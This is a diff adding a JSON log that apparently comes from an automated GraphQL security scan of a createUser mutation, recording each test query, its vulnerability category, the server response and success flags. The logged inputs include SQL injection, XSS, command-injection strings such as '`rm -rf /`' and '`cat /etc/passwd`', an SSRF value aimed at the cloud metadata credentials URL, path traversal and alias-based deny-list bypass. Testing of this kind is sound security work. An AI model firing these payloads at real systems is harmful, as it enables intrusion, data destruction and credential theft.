@@ -1,0 +1,359 @@
+[
+  {
+    "query": {
+      "query": "\nmutation {\n  createUser(input: {\n    name: \"New User\",\n    username: \"newuser123\",\n    email: \"newuser@example.com\",\n    address: {\n      street: \"123 Main St\",\n      suite: \"Apt 4B\",\n      city: \"Anytown\",\n      zipcode: \"12345-6789\",\n      geo: {\n        lat: 34.0522,\n        lng: -118.2437\n      }\n    },\n    phone: \"1-555-123-4567\",\n    website: \"newuser.org\",\n    company: {\n      name: \"NewCorp\",\n      catchPhrase: \"Innovation at its finest\",\n      bs: \"revolutionize transparent initiatives\"\n    }\n  }) {\n    id\n    name\n    email\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.93,
+    "timestamp": "2025-10-05T13:23:43.373738Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "createUser": {
+          "id": "11",
+          "name": "New User",
+          "email": "newuser@example.com"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createUser(input: {\n    name: \"SQL User ' OR 1=1 --\",\n    username: \"sql_inject_user\",\n    email: \"sql@example.com\",\n    address: {\n      street: \"123 SQL Drive\",\n      suite: \"Suite ' OR '1'='1\",\n      city: \"SQL City\",\n      zipcode: \"12345\",\n      geo: {\n        lat: 0.0,\n        lng: 0.0\n      }\n    },\n    phone: \"1-234-567-8901\",\n    website: \"sql-user.com\",\n    company: {\n      name: \"SQL Company\",\n      catchPhrase: \"SQL; DROP TABLES;\",\n      bs: \"SQL; INSERT INTO users (id, name) VALUES (999, 'evil');\"\n    }\n  }) {\n    id\n    name\n    email\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.288,
+    "timestamp": "2025-10-05T13:23:47.313437Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "createUser": {
+          "id": "11",
+          "name": "SQL User ' OR 1=1 --",
+          "email": "sql@example.com"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createUser(input: {\n    name: \"XSS User <script>alert('XSS')</script>\",\n    username: \"xss_user\",\n    email: \"<img src=x onerror=alert(1)>@example.com\",\n    address: {\n      street: \"XSS<svg/onload=alert(document.domain)> Street\",\n      suite: \"Apt <script>alert('suite XSS')</script>\",\n      city: \"XSS City\",\n      zipcode: \"12345\",\n      geo: {\n        lat: 0.0,\n        lng: 0.0\n      }\n    },\n    phone: \"1-234-567-8901\",\n    website: \"xss-site.com/search?q=<script>alert('website XSS')</script>\",\n    company: {\n      name: \"XSS Company\",\n      catchPhrase: \"XSS <marquee>Scroll Text</marquee>\",\n      bs: \"XSS <body onload=alert('body XSS')>\"\n    }\n  }) {\n    id\n    name\n    email\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.428,
+    "timestamp": "2025-10-05T13:23:51.001459Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "createUser": {
+          "id": "11",
+          "name": "XSS User <script>alert('XSS')</script>",
+          "email": "<img src=x onerror=alert(1)>@example.com"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createUser(input: {\n    name: \"SSRF User\",\n    username: \"ssrf_test\",\n    email: \"ssrf@example.com\",\n    address: {\n      street: \"123 SSRF Ave\",\n      suite: \"Penthouse\",\n      city: \"SSRFville\",\n      zipcode: \"12345\",\n      geo: {\n        lat: 0.0,\n        lng: 0.0\n      }\n    },\n    phone: \"1-800-SSRF-NOW\",\n    website: \"http://169.254.169.254/latest/meta-data/credentials\",\n    company: {\n      name: \"SSRF Corp\",\n      catchPhrase: \"Check out our internal docs at http://localhost/admin\",\n      bs: \"SSRF vulnerability testing\"\n    }\n  }) {\n    id\n    name\n    email\n    website\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.385,
+    "timestamp": "2025-10-05T13:23:54.246679Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "createUser": {
+          "id": "11",
+          "name": "SSRF User",
+          "email": "ssrf@example.com",
+          "website": "http://169.254.169.254/latest/meta-data/credentials"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createUser(input: {\n    name: \"Command Injector\",\n    username: \"`cat /etc/passwd`\",\n    email: \"cmd_inject@example.com\",\n    address: {\n      street: \"123 `rm -rf /`\",\n      suite: \"Unit 1\",\n      city: \"Cmdville\",\n      zipcode: \"12345\",\n      geo: {\n        lat: 0.0,\n        lng: 0.0\n      }\n    },\n    phone: \"1-555-555-5555\",\n    website: \"command.com; ls -la;\",\n    company: {\n      name: \"Cmd Injection Inc.\",\n      catchPhrase: \"System('echo hello');\",\n      bs: \"Run system commands here\"\n    }\n  }) {\n    id\n    name\n    email\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.017,
+    "timestamp": "2025-10-05T13:23:57.667795Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "createUser": {
+          "id": "11",
+          "name": "Command Injector",
+          "email": "cmd_inject@example.com"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createUser(input: {\n    name: \"Path Traversal User\",\n    username: \"path_traverse\",\n    email: \"path@example.com\",\n    address: {\n      street: \"../../etc/passwd\",\n      suite: \"../../../../../boot.ini\",\n      city: \"Pathville\",\n      zipcode: \"12345\",\n      geo: {\n        lat: 0.0,\n        lng: 0.0\n      }\n    },\n    phone: \"1-987-654-3210\",\n    website: \"file:///etc/passwd\",\n    company: {\n      name: \"PathFinder\",\n      catchPhrase: \"Access any file!\",\n      bs: \"explore ../../ directory\"\n    }\n  }) {\n    id\n    name\n    email\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.092,
+    "timestamp": "2025-10-05T13:24:00.362567Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "createUser": {
+          "id": "11",
+          "name": "Path Traversal User",
+          "email": "path@example.com"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createUser(input: {\n    name: \"HTML Injector <h1>Important!</h1>\",\n    username: \"html_user\",\n    email: \"<a href='http://evil.com'>Click Me!</a>@example.com\",\n    address: {\n      street: \"123 HTML Street <p>Paragraph here</p>\",\n      suite: \"Suite <b>Bold Text</b>\",\n      city: \"HTML City\",\n      zipcode: \"12345\",\n      geo: {\n        lat: 0.0,\n        lng: 0.0\n      }\n    },\n    phone: \"1-111-222-3333\",\n    website: \"html-injection.com/page?content=<div>Malicious Content</div>\",\n    company: {\n      name: \"HTML Inc.\",\n      catchPhrase: \"<u>Underlined text</u>\",\n      bs: \"<i>Italicized statement</i>\"\n    }\n  }) {\n    id\n    name\n    email\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.068,
+    "timestamp": "2025-10-05T13:24:02.948901Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "createUser": {
+          "id": "11",
+          "name": "HTML Injector <h1>Important!</h1>",
+          "email": "<a href='http://evil.com'>Click Me!</a>@example.com"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createUser(input: {\n    name: \"Bypass User\",\n    username: \"bypass_non_aliased\",\n    email: \"bypass@example.com\",\n    address: {\n      street: \"123 Bypass Blvd\",\n      suite: \"PH\",\n      city: \"Access\",\n      zipcode: \"98765\",\n      geo: {\n        lat: 1.1,\n        lng: 2.2\n      }\n    },\n    phone: \"1-222-333-4444\",\n    website: \"bypass-site.com\",\n    company: {\n      name: \"Bypass Co\",\n      catchPhrase: \"Just bypass it\",\n      bs: \"Bypass security\"\n    }\n  }) {\n    id\n    name\n    email\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.035,
+        "timestamp": "2025-10-05T13:24:06.083295Z",
+        "response_body": {
+          "data": {
+            "createUser": {
+              "id": "11",
+              "name": "Bypass User",
+              "email": "bypass@example.com"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.098,
+        "timestamp": "2025-10-05T13:24:07.181165Z",
+        "response_body": {
+          "data": {
+            "aliasedCreateUser": {
+              "id": "11",
+              "name": "Aliased Bypass User",
+              "username": "bypass_aliased"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-05T13:24:07.181217Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 1.064,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation BypassedQuery {\n  aliasedCreateUser: createUser(input: {\n    name: \"Aliased Bypass User\",\n    username: \"bypass_aliased\",\n    email: \"aliased_bypass@example.com\",\n    address: {\n      street: \"456 Aliased Rd\",\n      suite: \"Unit 10\",\n      city: \"Aliased\",\n      zipcode: \"54321\",\n      geo: {\n        lat: 3.3,\n        lng: 4.4\n      }\n    },\n    phone: \"1-444-555-6666\",\n    website: \"aliased-bypass.com\",\n    company: {\n      name: \"Aliased Sec\",\n      catchPhrase: \"Aliased access\",\n      bs: \"Aliased security testing\"\n    }\n  }) {\n    id\n    name\n    username\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.234,
+        "timestamp": "2025-10-05T13:24:11.549331Z",
+        "response_body": {
+          "data": {
+            "createUser": {
+              "id": "11",
+              "name": "Bypass User",
+              "email": "bypass@example.com"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.494,
+        "timestamp": "2025-10-05T13:24:13.043723Z",
+        "response_body": {
+          "data": {
+            "aliasedCreateUser": {
+              "id": "11",
+              "name": "Aliased Bypass User",
+              "username": "bypass_aliased"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-10-05T13:24:13.043745Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.981,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createUser(input: {\n    name: \"Introspection User\",\n    username: \"introspect_user\",\n    email: \"introspect@example.com\",\n    address: {\n      street: \"GraphQL Street\",\n      suite: \"Apt 1\",\n      city: \"Schema Town\",\n      zipcode: \"00000\",\n      geo: {\n        lat: 0.0,\n        lng: 0.0\n      }\n    },\n    phone: \"1-000-000-0000\",\n    website: \"graphql.org\",\n    company: {\n      name: \"Introspection Co.\",\n      catchPhrase: \"Exploring types\",\n      bs: \"schema discovery\"\n    }\n  }) {\n    id\n    name\n    email\n    __typename \n  }\n}\n\nquery IntrospectionQuery {\n  __schema {\n    types {\n      name\n      kind\n      description\n      fields {\n        name\n        type {\n          name\n          kind\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.952,
+    "timestamp": "2025-10-05T13:24:17.078179Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "This anonymous operation must be the only defined operation.",
+          "locations": [
+            {
+              "line": 2,
+              "column": 1
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createUser(input: {\n    name: \"Suggestion User\",\n    username: \"suggest_user\",\n    email: \"suggest@example.com\",\n    address: {\n      street: \"Suggestion Street\",\n      suite: \"Apt A\",\n      city: \"Suggestville\",\n      zipcode: \"10101\",\n      geo: {\n        lat: 0.0,\n        lng: 0.0\n      }\n    },\n    phone: \"1-123-456-7890\",\n    website: \"suggestion.com\",\n    company: {\n      name: \"Suggestion Corp.\",\n      catchPhrase: \"Helping you find fields\",\n      bs: \"type inference\"\n    }\n  }) {\n    id\n    name\n    emaill # Typo to trigger suggestions\n    adrress # Typo to trigger suggestions\n    companie # Typo to trigger suggestions\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.976,
+    "timestamp": "2025-10-05T13:24:20.191577Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"emaill\" on type \"User\". Did you mean \"email\"?",
+          "locations": [
+            {
+              "line": 27,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"adrress\" on type \"User\". Did you mean \"address\"?",
+          "locations": [
+            {
+              "line": 28,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"companie\" on type \"User\". Did you mean \"company\"?",
+          "locations": [
+            {
+              "line": 29,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
